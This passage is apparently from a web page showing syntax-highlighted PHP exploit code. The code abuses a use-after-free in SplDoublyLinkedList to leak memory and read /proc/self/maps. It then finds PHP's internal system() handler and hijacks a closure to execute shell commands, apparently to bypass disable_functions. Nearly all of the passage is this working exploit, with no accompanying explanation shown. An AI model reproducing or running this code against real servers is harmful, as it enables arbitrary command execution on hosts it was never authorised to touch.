<span class="token string">", length: 0x"</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bomb1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0x5454545454545454</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x7ffff0000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Where is here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bomb2</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">0x200000</span><span class="token punctuation">,</span> <span class="token number">0x200000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Not Found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token number">0x108</span> <span class="token operator">+</span> <span class="token variable">$address</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$x</span> <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0x1234567812345678</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"[+]SplDoublyLinkedList Element: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getClosureChunk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">do</span> <span class="token punctuation">{</span>     <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Closure Chunk: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getSystem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$address</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffffff0000</span><span class="token punctuation">;</span>  <span class="token variable">$lowestAddr</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$address</span> <span class="token operator">&amp;</span> <span class="token number">0x0000fffffff00000</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x0000000001000000</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token number">0x80</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">&lt;</span> <span class="token variable">$lowestAddr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>     <span class="token variable">$nameAddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nameAddr</span> <span class="token operator">></span> <span class="token variable">$address</span> <span class="token operator">||</span> <span class="token variable">$nameAddr</span> <span class="token operator">&lt;</span> <span class="token variable">$lowestAddr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">continue</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$nameAddr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_pad</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token constant">STR_PAD_LEFT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">===</span> <span class="token string">"system"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Trigger</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>     <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1234567812345678</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0x1234567812345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]UAF Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>     <span class="token variable">$maps</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$maps</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token function">cantRead</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>       <span class="token function">canRead</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>     <span class="token keyword">echo</span> <span class="token string">"[+]Done"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bypass</span><span class="token punctuation">(</span><span class="token variable">$elementAddress</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$closureChunkAddress</span> <span class="token operator">=</span> <span class="token function">getClosureChunk</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$elementAddress</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get Closure Chunk Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token variable">$closure_object</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closureChunkAddress</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Closure Object: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$closure_object</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Closure Handler: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$system_address</span> <span class="token operator">=</span> <span class="token function">getSystem</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closure_handlers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Couldn't determine system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Find system's handler: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$system_address</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x506</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">0x130</span> <span class="token operator">/</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x08</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x08</span> <span class="token operator">*</span> <span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$system_address</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x108</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Executing command: \n"</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"php -v"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">canRead</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$chunkAddress</span> <span class="token operator">=</span> <span class="token function">getPHPChunk</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get PHP Chunk Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$elementAddress</span> <span class="token operator">=</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$chunkAddress</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get SplDoublyLinkedList Element Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token function">bypass</span><span class="token punctuation">(</span><span class="token variable">$elementAddress</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">cantRead</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Please try to get address of PHP Chunk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">bomb1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$elementAddress</span> <span class="token operator">=</span> <span class="token function">bomb2</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$elementAddress</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get SplDoublyLinkedList Element Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token function">bypass</span><span class="token punctuation">(</span><span class="token variable">$elementAddress</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplDoublyLinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"Twings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0x1234567812345678</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></